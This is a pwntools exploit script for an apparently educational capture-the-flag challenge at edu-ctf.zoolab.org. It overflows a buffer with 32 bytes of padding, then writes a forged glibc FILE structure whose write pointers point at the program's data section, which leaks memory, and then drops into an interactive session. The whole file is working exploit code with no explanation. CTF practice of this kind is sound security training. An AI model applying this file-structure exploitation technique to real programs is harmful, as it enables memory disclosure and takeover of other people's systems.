from pwn import *

context.arch = 'amd64'
context.terminal = ['tmux','splitw','-h']
ip = 'edu-ctf.zoolab.org'
port = 10010
local = False

if local :
    s = process('./chal')
else:
    s = remote(ip,port)

fake_fd = flat(
0xfbad0800, #_flags
0,        # char* _IO_read_ptr;   /* Current read pointer */
0x404050, # char* _IO_read_end;   /* End of get area. */
0,        # char* _IO_read_base;  /* Start of putback+get area. */
0x404050, # char* _IO_write_base; /* Start of put area. */
0x404060, # char* _IO_write_ptr;  /* Current put pointer. */
0,        # char* _IO_write_end;  /* End of put area. */
0,        # char* _IO_buf_base;   /* Start of reserve area. */
0,        # char* _IO_buf_end;    /* End of reserve area. */
0,        # char *_IO_save_base; /* Pointer to start of non-current get area. */
0,        # char *_IO_backup_base;  /* Pointer to first valid character of backup area */
0,        # char *_IO_save_end; /* Pointer to end of non-current get area. */
0,
0,
1
)
#gdb.attach(s)
s.send(b'A'*32+fake_fd)
s.interactive()